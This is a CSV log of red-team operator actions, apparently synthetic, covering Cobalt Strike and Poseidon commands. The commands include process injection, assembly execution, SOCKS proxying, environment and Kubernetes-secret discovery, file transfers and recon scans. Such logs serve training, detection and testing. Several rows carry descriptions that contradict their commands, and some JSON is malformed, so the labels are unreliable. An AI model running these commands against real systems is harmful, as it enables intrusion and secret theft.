entry_identifier,start_date,end_date,source_ip,dest_ip,tool,user_context,command,description,output,comments,operator_name,extra_fields,oplog_id,tags
1665,2024-06-12 03:41:05,2024-06-12 03:41:05.604017,155.225.136.72,64.69.133.141,OST,sfranklin@gordon.com,bbot -t bryant.biz-f safe -ef passive,PID: 27493,Success,Using BBOT safe and passive modules,Christy Green,,,
1666,2024-02-11 17:42:19,2024-02-14 11:30:13,63.79.24.226,18.176.66.97,Poseidon,jschmitt@martinez.com,"socks {""action"":""start"",""port"":17228}","PID 4150, Callback 98",Failed,Attempting to start a SOCKS proxy,Deborah Hunter,,,
1667,2024-05-18 02:07:14,2024-05-18 02:07:14.420709,155.225.136.72,174.200.177.205,Poseidon,fwilliams@mays.com,"upload {""file_id"":""fba94ea9-392e-47e6-ba14-b926c198995e"",""remote_path""/production/tough.wav"",""overwrite"":false}","PID 10980, Callback 52",Success,Attempting to upload a file,Christy Green,,,
1668,2024-06-26 17:34:27,2024-06-26 17:34:27.428997,42.118.146.148,126.91.142.205,Poseidon,fwilliams@mays.com,pty ./kubectl get pods,"PID 24116, Callback 48",Failed,Conducting container discovery,Richard Mcbride,,,
1669,2024-04-08 18:00:48,2024-04-08 18:00:48.355004,63.79.24.226,35.79.43.142,Cobalt Strike,sfranklin@gordon.com,execute-assembly /already/no.exe,PID 27839,Success,Running a local .NET executable,Richard Mcbride,,,
1670,2024-06-25 10:10:21,2024-06-25 10:10:21.009964,163.193.224.188,18.176.66.97,Cobalt Strike,sfranklin@gordon.com,sleep 59,PID 14288,Success,Sleeping a beacon,Deborah Hunter,,,
1671,2024-06-10 15:05:05,2024-06-10 15:05:05.255936,63.79.24.226,174.200.177.205,Cobalt Strike,sarahallen@combs-anderson.com,execute-assembly /already/no.exe,PID 27839,Success,Running a local .NET executable,Richard Mcbride,,,
1672,2024-03-23 16:42:21,2024-03-23 16:42:21.078429,155.225.136.72,126.91.142.205,Cobalt Strike,johngross@jones.com,spawn x64 HTTPS,PID 24618,Failed,Navigating to a directory,Deborah Hunter,,,
1673,2023-12-18 07:06:41,2023-12-19 16:37:53,206.174.99.211,126.91.142.205,Poseidon,jschmitt@martinez.com,pty whoami,"PID 1514, Callback 14",Success,Obtaining user context,Richard Mcbride,,,
1674,2023-12-22 07:11:31,2024-02-12 21:17:12,112.130.185.251,35.79.43.142,OST,jschmitt@martinez.com,cd /maintain/father,PID: 13177,Failed,Navigating to a directory,Christy Green,,,
1675,2024-06-04 05:23:02,2024-06-04 05:23:02.066735,42.118.146.148,18.176.66.97,OST,sfranklin@gordon.com,python3 CloudScraper.py -u aguilar.com >> /deal/more.txt,PID: 22835,Failed,Navigating to a directory,Christy Green,,,
1676,2024-03-09 05:45:12,2024-03-09 05:45:12.460262,206.0.98.240,157.2.65.239,OST,sfranklin@gordon.com,sleep 99,PID: 27092,Failed,Sleeping a beacon,Christy Green,,,
1677,2024-02-23 20:35:36,2024-02-23 20:35:36.297722,206.174.99.211,126.91.142.205,Cobalt Strike,jschmitt@martinez.com,execute-assembly /already/no.exe,PID 27839,Failed,Running a local .NET executable,Christy Green,,,
1678,2024-05-12 03:26:30,2024-05-12 03:26:30.943588,63.79.24.226,157.2.65.239,OST,jschmitt@martinez.com,download /form/with/player.mp3,PID: 16216,Success,Downloading a file,Deborah Hunter,,,
1679,2024-01-17 15:40:02,2024-02-05 11:33:33,63.79.24.226,18.176.66.97,Poseidon,hendersonjohn@dalton-lam.com,"socks {""action"":""start"",""port"":17228}","PID 4150, Callback 98",Failed,Attempting to start a SOCKS proxy,Christy Green,,,
1680,2024-04-27 13:56:42,2024-04-27 13:56:42.344254,206.174.99.211,64.69.133.141,Cobalt Strike,johngross@jones.com,sleep 59,PID 14288,Failed,Sleeping a beacon,Christy Green,,,
1681,2024-06-04 01:30:41,2024-06-04 01:30:41.852735,163.193.224.188,35.79.43.142,OST,jschmitt@martinez.com,bbot -t alvarez-ware.com-m nmap,PID: 10705,Failed,Using BBOT port scan,Christy Green,,,
1682,2024-05-21 13:19:19,2024-05-21 13:19:19.100112,206.174.99.211,157.2.65.239,Cobalt Strike,seanlopez@green-bullock.com,pwd,PID 29413,Success,Obtaining current working directory,Christy Green,,,
1683,2024-06-13 00:17:15,2024-06-13 00:17:15.354970,206.174.99.211,84.240.138.150,Cobalt Strike,jschmitt@martinez.com,sleep 59,PID 14288,Success,Sleeping a beacon,Deborah Hunter,,,
1684,2024-02-25 11:11:42,2024-02-25 11:11:42.573737,112.130.185.251,84.240.138.150,Poseidon,jschmitt@martinez.com,pty curl,"PID 10472, Callback 96",Success,Attempting to use cURL,Deborah Hunter,,,
1685,2024-02-18 02:47:05,2024-02-18 02:47:05.078223,206.174.99.211,18.176.66.97,Poseidon,fwilliams@mays.com,pty ./kubectl get secrets,"PID 14863, Callback 32",Success,Conducting container discovery,Christy Green,,,
1686,2024-06-27 18:05:23,2024-06-27 18:05:23.216958,42.118.146.148,35.79.43.142,Cobalt Strike,sfranklin@gordon.com,spawn x64 HTTPS,PID 24618,Failed,Navigating to a directory,Richard Mcbride,,,
1687,2024-03-27 13:50:35,2024-03-27 13:50:35.126535,112.130.185.251,126.91.142.205,Cobalt Strike,sarahallen@combs-anderson.com,cd /work/draw/event/training,PID 15662,Failed,Navigating to a directory,Christy Green,,,
1688,2024-06-09 00:02:21,2024-06-09 00:02:21.087570,42.118.146.148,174.200.177.205,OST,jschmitt@martinez.com,download /form/with/player.mp3,PID: 16216,Success,Downloading a file,Richard Mcbride,,,
1689,2024-01-07 01:43:20,2024-01-13 14:16:08,206.174.99.211,35.79.43.142,Cobalt Strike,sfranklin@gordon.com,sleep 59,PID 14288,Failed,Sleeping a beacon,Richard Mcbride,,,
1690,2024-05-01 05:38:04,2024-05-01 05:38:04.859026,112.130.185.251,126.91.142.205,OST,sfranklin@gordon.com,ls,PID: 13267,Success,Listing files and directories,Richard Mcbride,,,
1691,2024-03-18 19:19:22,2024-03-18 19:19:22.043920,163.193.224.188,84.240.138.150,OST,jschmitt@martinez.com,cd /maintain/father,PID: 13177,Success,Navigating to a directory,Richard Mcbride,,,
1692,2024-03-03 03:47:17,2024-03-03 03:47:17.508039,42.118.146.148,157.2.65.239,Cobalt Strike,sfranklin@gordon.com,spawn x64 HTTPS,PID 24618,Failed,Navigating to a directory,Richard Mcbride,,,
1693,2024-03-28 20:53:05,2024-03-28 20:53:05.342669,112.130.185.251,35.79.43.142,Cobalt Strike,seanlopez@green-bullock.com,shinject 13530 x64 /edge.bin,PID 20047,Success,Attempting process injection,Richard Mcbride,,,
1694,2024-06-13 13:34:10,2024-06-13 13:34:10.342571,155.225.136.72,35.79.43.142,Poseidon,seanlopez@green-bullock.com,"upload {""file_id"":""fba94ea9-392e-47e6-ba14-b926c198995e"",""remote_path""/production/tough.wav"",""overwrite"":false}","PID 10980, Callback 52",Failed,Attempting to upload a file,Richard Mcbride,,,
1695,2023-12-30 05:02:28,2024-02-15 20:07:11,206.174.99.211,64.69.133.141,Poseidon,seanlopez@green-bullock.com,sleep 38,"PID 16959, Callback 63",Success,Sleeping a beacon,Christy Green,,,
1696,2024-05-14 06:27:55,2024-05-14 06:27:55.624367,42.118.146.148,126.91.142.205,Cobalt Strike,sfranklin@gordon.com,inject-assembly 4451 /third/middle.exe,PID 23112,Failed,Injecting assembly into a process,Christy Green,,,
1697,2024-06-18 04:48:33,2024-06-18 04:48:33.301085,163.193.224.188,174.200.177.205,Poseidon,johngross@jones.com,getenv,"PID 25658, Callback 42",Failed,Attempting to get environment variables,Deborah Hunter,,,
1698,2024-05-09 18:04:26,2024-05-09 18:04:26.685398,206.0.98.240,157.2.65.239,Poseidon,johngross@jones.com,"upload {""file_id"":""fba94ea9-392e-47e6-ba14-b926c198995e"",""remote_path""/production/tough.wav"",""overwrite"":false}","PID 10980, Callback 52",Success,Attempting to upload a file,Deborah Hunter,,,
1699,2024-04-19 19:27:15,2024-04-19 19:27:15.169848,163.193.224.188,174.200.177.205,Poseidon,hendersonjohn@dalton-lam.com,pty ./kubectl get secrets,"PID 14863, Callback 32",Success,Conducting container discovery,Richard Mcbride,,,
1700,2024-01-25 02:15:00,2024-01-29 04:55:29,112.130.185.251,157.2.65.239,Cobalt Strike,johngross@jones.com,shinject 13530 x64 /edge.bin,PID 20047,Success,Attempting process injection,Richard Mcbride,,,
1701,2024-05-05 02:06:11,2024-05-05 02:06:11.577391,42.118.146.148,157.2.65.239,Poseidon,sarahallen@combs-anderson.com,pty ./kubectl get namespaces -n cluster,"PID 459, Callback 68",Failed,Conducting container discovery,Richard Mcbride,,,
1702,2024-04-08 20:54:50,2024-04-08 20:54:50.329455,206.174.99.211,35.79.43.142,Poseidon,hendersonjohn@dalton-lam.com,pty curl,"PID 10472, Callback 96",Success,Attempting to use cURL,Deborah Hunter,,,
1703,2024-03-24 13:13:15,2024-03-24 13:13:15.460325,112.130.185.251,174.200.177.205,Cobalt Strike,sfranklin@gordon.com,execute-assembly /already/no.exe,PID 27839,Failed,Running a local .NET executable,Deborah Hunter,,,
1704,2024-06-19 19:38:01,2024-06-19 19:38:01.364321,112.130.185.251,84.240.138.150,Cobalt Strike,fwilliams@mays.com,pwd,PID 29413,Failed,Obtaining current working directory,Christy Green,,,
1705,2023-12-26 21:12:44,2024-02-03 02:00:57,63.79.24.226,64.69.133.141,Poseidon,sarahallen@combs-anderson.com,pty ./kubectl get pods,"PID 24116, Callback 48",Failed,Conducting container discovery,Richard Mcbride,,,
1706,2024-06-02 03:29:37,2024-06-02 03:29:37.255086,206.174.99.211,35.79.43.142,Cobalt Strike,fwilliams@mays.com,cd /work/draw/event/training,PID 15662,Failed,Navigating to a directory,Richard Mcbride,,,
1707,2024-03-10 05:55:06,2024-03-10 05:55:06.434187,206.174.99.211,18.176.66.97,Cobalt Strike,hendersonjohn@dalton-lam.com,spawn x64 HTTPS,PID 24618,Failed,Navigating to a directory,Richard Mcbride,,,
1708,2024-04-25 09:18:04,2024-04-25 09:18:04.626612,155.225.136.72,84.240.138.150,Cobalt Strike,seanlopez@green-bullock.com,cd /work/draw/event/training,PID 15662,Failed,Navigating to a directory,Christy Green,,,
1709,2024-04-25 03:12:10,2024-04-25 03:12:10.366104,42.118.146.148,35.79.43.142,Cobalt Strike,jschmitt@martinez.com,upload /western/board/job.csv,PID 5354,Success,Attempting a file upload,Deborah Hunter,,,
1710,2024-02-27 22:15:43,2024-02-27 22:15:43.741280,63.79.24.226,174.200.177.205,OST,seanlopez@green-bullock.com,sleep 99,PID: 27092,Failed,Sleeping a beacon,Christy Green,,,
1711,2024-03-12 16:01:32,2024-03-12 16:01:32.322024,206.0.98.240,84.240.138.150,Poseidon,sarahallen@combs-anderson.com,pty ./kubectl get secrets,"PID 14863, Callback 32",Failed,Conducting container discovery,Deborah Hunter,,,
1712,2024-02-05 20:50:28,2024-02-05 23:46:30,112.130.185.251,35.79.43.142,Cobalt Strike,sfranklin@gordon.com,upload /western/board/job.csv,PID 5354,Success,Attempting a file upload,Christy Green,,,
1713,2024-05-07 19:50:06,2024-05-07 19:50:06.217503,206.0.98.240,174.200.177.205,Cobalt Strike,jschmitt@martinez.com,execute-assembly /already/no.exe,PID 27839,Success,Running a local .NET executable,Christy Green,,,
1714,2024-03-14 08:39:28,2024-03-14 08:39:28.570934,163.193.224.188,126.91.142.205,OST,hendersonjohn@dalton-lam.com,sleep 99,PID: 27092,Success,Sleeping a beacon,Richard Mcbride,,,
1715,2024-03-17 21:55:12,2024-03-17 21:55:12.854162,42.118.146.148,157.2.65.239,Cobalt Strike,sarahallen@combs-anderson.com,pwd,PID 29413,Success,Obtaining current working directory,Christy Green,,,
1716,2024-05-31 14:13:50,2024-05-31 14:13:50.200336,112.130.185.251,174.200.177.205,Poseidon,seanlopez@green-bullock.com,"upload {""file_id"":""fba94ea9-392e-47e6-ba14-b926c198995e"",""remote_path""/production/tough.wav"",""overwrite"":false}","PID 10980, Callback 52",Success,Attempting to upload a file,Richard Mcbride,,,
1717,2024-04-05 16:21:42,2024-04-05 16:21:42.511358,206.174.99.211,84.240.138.150,OST,jschmitt@martinez.com,python3 CloudScraper.py -u aguilar.com >> /deal/more.txt,PID: 22835,Success,Navigating to a directory,Deborah Hunter,,,
1718,2024-04-05 10:02:10,2024-04-05 10:02:10.350106,155.225.136.72,64.69.133.141,Poseidon,hendersonjohn@dalton-lam.com,pty ./kubectl get namespaces -n cluster,"PID 459, Callback 68",Success,Conducting container discovery,Christy Green,,,
1719,2024-01-20 03:19:38,2024-02-10 13:44:32,112.130.185.251,64.69.133.141,Poseidon,seanlopez@green-bullock.com,"upload {""file_id"":""fba94ea9-392e-47e6-ba14-b926c198995e"",""remote_path""/production/tough.wav"",""overwrite"":false}","PID 10980, Callback 52",Failed,Attempting to upload a file,Richard Mcbride,,,
1720,2024-06-10 17:20:32,2024-06-10 17:20:32.399811,112.130.185.251,157.2.65.239,OST,sarahallen@combs-anderson.com,ls,PID: 13267,Success,Listing files and directories,Richard Mcbride,,,
1721,2024-05-18 22:38:03,2024-05-18 22:38:03.928326,155.225.136.72,157.2.65.239,OST,seanlopez@green-bullock.com,bbot -t bryant.biz-f safe -ef passive,PID: 27493,Failed,Using BBOT safe and passive modules,Deborah Hunter,,,
1722,2024-04-23 17:36:09,2024-04-23 17:36:09.993220,163.193.224.188,126.91.142.205,OST,sarahallen@combs-anderson.com,cd /maintain/father,PID: 13177,Failed,Navigating to a directory,Deborah Hunter,,,
1723,2024-03-19 09:41:01,2024-03-19 09:41:01.930630,155.225.136.72,84.240.138.150,Cobalt Strike,johngross@jones.com,inject-assembly 4451 /third/middle.exe,PID 23112,Success,Injecting assembly into a process,Christy Green,,,
1724,2024-01-23 15:41:49,2024-02-03 06:38:05,63.79.24.226,84.240.138.150,Cobalt Strike,seanlopez@green-bullock.com,spawnto x64 /hour/beautiful.numbers,PID 15526,Success,Selecting executable for post-exploitation jobs,Christy Green,,,
1725,2024-03-15 07:28:25,2024-03-15 07:28:25.200339,163.193.224.188,18.176.66.97,Cobalt Strike,sarahallen@combs-anderson.com,spawnto x64 /hour/beautiful.numbers,PID 15526,Success,Selecting executable for post-exploitation jobs,Deborah Hunter,,,
1726,2023-12-31 15:18:27,2024-02-10 18:16:08,206.174.99.211,64.69.133.141,Cobalt Strike,sfranklin@gordon.com,spawnto x64 /hour/beautiful.numbers,PID 15526,Failed,Selecting executable for post-exploitation jobs,Deborah Hunter,,,
1727,2023-12-17 11:04:40,2023-12-20 01:06:47,163.193.224.188,157.2.65.239,Cobalt Strike,sfranklin@gordon.com,pwd,PID 29413,Success,Obtaining current working directory,Richard Mcbride,,,
1728,2024-03-09 08:36:50,2024-03-09 08:36:50.726774,63.79.24.226,157.2.65.239,Poseidon,fwilliams@mays.com,pty ./kubectl get secrets,"PID 14863, Callback 32",Failed,Conducting container discovery,Christy Green,,,
1729,2024-01-06 02:52:51,2024-01-11 20:22:34,163.193.224.188,126.91.142.205,Poseidon,seanlopez@green-bullock.com,"socks {""action"":""start"",""port"":17228}","PID 4150, Callback 98",Success,Attempting to start a SOCKS proxy,Deborah Hunter,,,
1730,2024-05-19 17:07:22,2024-05-19 17:07:22.659633,163.193.224.188,84.240.138.150,OST,seanlopez@green-bullock.com,sleep 99,PID: 27092,Success,Sleeping a beacon,Deborah Hunter,,,
1731,2024-03-28 15:49:09,2024-03-28 15:49:09.738855,63.79.24.226,18.176.66.97,Cobalt Strike,sfranklin@gordon.com,execute-assembly /already/no.exe,PID 27839,Failed,Running a local .NET executable,Richard Mcbride,,,
1732,2024-01-07 11:31:21,2024-01-20 13:50:16,42.118.146.148,157.2.65.239,Poseidon,sarahallen@combs-anderson.com,getenv,"PID 25658, Callback 42",Success,Attempting to get environment variables,Richard Mcbride,,,
1733,2024-05-22 13:55:50,2024-05-22 13:55:50.484944,112.130.185.251,64.69.133.141,Cobalt Strike,sfranklin@gordon.com,upload /western/board/job.csv,PID 5354,Success,Attempting a file upload,Deborah Hunter,,,
1734,2024-02-26 15:28:59,2024-02-26 15:28:59.415159,206.174.99.211,126.91.142.205,Poseidon,hendersonjohn@dalton-lam.com,pty curl,"PID 10472, Callback 96",Failed,Attempting to use cURL,Richard Mcbride,,,
1735,2024-04-17 05:12:11,2024-04-17 05:12:11.648727,42.118.146.148,64.69.133.141,OST,fwilliams@mays.com,ls,PID: 13267,Success,Listing files and directories,Christy Green,,,
1736,2024-05-28 05:04:33,2024-05-28 05:04:33.380813,112.130.185.251,84.240.138.150,Cobalt Strike,jschmitt@martinez.com,inject-assembly 4451 /third/middle.exe,PID 23112,Success,Injecting assembly into a process,Deborah Hunter,,,
1737,2023-12-19 19:25:22,2024-01-28 02:44:59,155.225.136.72,84.240.138.150,OST,johngross@jones.com,python3 CloudScraper.py -u aguilar.com >> /deal/more.txt,PID: 22835,Success,Navigating to a directory,Christy Green,,,
1738,2024-04-21 12:59:12,2024-04-21 12:59:12.935124,206.174.99.211,126.91.142.205,Cobalt Strike,sarahallen@combs-anderson.com,spawnto x64 /hour/beautiful.numbers,PID 15526,Success,Selecting executable for post-exploitation jobs,Richard Mcbride,,,
1739,2024-02-08 07:15:21,2024-02-10 15:58:51,63.79.24.226,84.240.138.150,Poseidon,johngross@jones.com,"upload {""file_id"":""fba94ea9-392e-47e6-ba14-b926c198995e"",""remote_path""/production/tough.wav"",""overwrite"":false}","PID 10980, Callback 52",Success,Attempting to upload a file,Richard Mcbride,,,
1740,2024-06-16 05:52:37,2024-06-16 05:52:37.729769,206.174.99.211,64.69.133.141,Cobalt Strike,fwilliams@mays.com,spawn x64 HTTPS,PID 24618,Success,Navigating to a directory,Deborah Hunter,,,
1741,2024-04-28 15:08:42,2024-04-28 15:08:42.985287,63.79.24.226,64.69.133.141,OST,johngross@jones.com,sleep 99,PID: 27092,Failed,Sleeping a beacon,Richard Mcbride,,,
1742,2024-03-08 18:59:14,2024-03-08 18:59:14.415923,112.130.185.251,174.200.177.205,OST,sfranklin@gordon.com,ls,PID: 13267,Success,Listing files and directories,Richard Mcbride,,,
1743,2024-06-02 14:12:31,2024-06-02 14:12:31.948858,112.130.185.251,157.2.65.239,Cobalt Strike,sarahallen@combs-anderson.com,inject-assembly 4451 /third/middle.exe,PID 23112,Success,Injecting assembly into a process,Deborah Hunter,,,
1744,2024-06-21 04:22:56,2024-06-21 04:22:56.121057,206.0.98.240,126.91.142.205,Cobalt Strike,hendersonjohn@dalton-lam.com,inject-assembly 4451 /third/middle.exe,PID 23112,Success,Injecting assembly into a process,Deborah Hunter,,,
1745,2024-06-23 09:04:11,2024-06-23 09:04:11.447116,206.0.98.240,84.240.138.150,Poseidon,sfranklin@gordon.com,sleep 38,"PID 16959, Callback 63",Success,Sleeping a beacon,Richard Mcbride,,,
1746,2023-12-17 07:37:04,2024-01-22 11:31:12,112.130.185.251,174.200.177.205,Cobalt Strike,fwilliams@mays.com,shinject 13530 x64 /edge.bin,PID 20047,Failed,Attempting process injection,Deborah Hunter,,,
1747,2024-04-11 20:28:12,2024-04-11 20:28:12.590687,206.174.99.211,126.91.142.205,OST,seanlopez@green-bullock.com,python3 CloudScraper.py -u aguilar.com >> /deal/more.txt,PID: 22835,Failed,Navigating to a directory,Deborah Hunter,,,
1748,2023-12-21 04:54:23,2024-02-06 12:55:35,206.0.98.240,35.79.43.142,Cobalt Strike,sfranklin@gordon.com,spawnto x64 /hour/beautiful.numbers,PID 15526,Success,Selecting executable for post-exploitation jobs,Richard Mcbride,,,
1749,2024-07-01 11:52:25,2024-07-01 11:52:25.415818,163.193.224.188,35.79.43.142,Poseidon,sfranklin@gordon.com,"socks {""action"":""start"",""port"":17228}","PID 4150, Callback 98",Failed,Attempting to start a SOCKS proxy,Christy Green,,,
1750,2024-05-04 05:20:30,2024-05-04 05:20:30.195087,155.225.136.72,126.91.142.205,OST,jschmitt@martinez.com,download /form/with/player.mp3,PID: 16216,Failed,Downloading a file,Christy Green,,,
1751,2023-12-21 21:59:58,2023-12-26 03:35:45,63.79.24.226,64.69.133.141,Cobalt Strike,sarahallen@combs-anderson.com,cd /work/draw/event/training,PID 15662,Failed,Navigating to a directory,Deborah Hunter,,,
1752,2024-03-29 00:07:46,2024-03-29 00:07:46.823813,112.130.185.251,157.2.65.239,Poseidon,hendersonjohn@dalton-lam.com,"upload {""file_id"":""fba94ea9-392e-47e6-ba14-b926c198995e"",""remote_path""/production/tough.wav"",""overwrite"":false}","PID 10980, Callback 52",Failed,Attempting to upload a file,Christy Green,,,
1753,2024-01-09 15:05:41,2024-01-10 15:54:36,163.193.224.188,64.69.133.141,Poseidon,seanlopez@green-bullock.com,pty ./kubectl can-i create pod,"PID 11021, Callback 4",Success,Conducting container discovery,Christy Green,,,
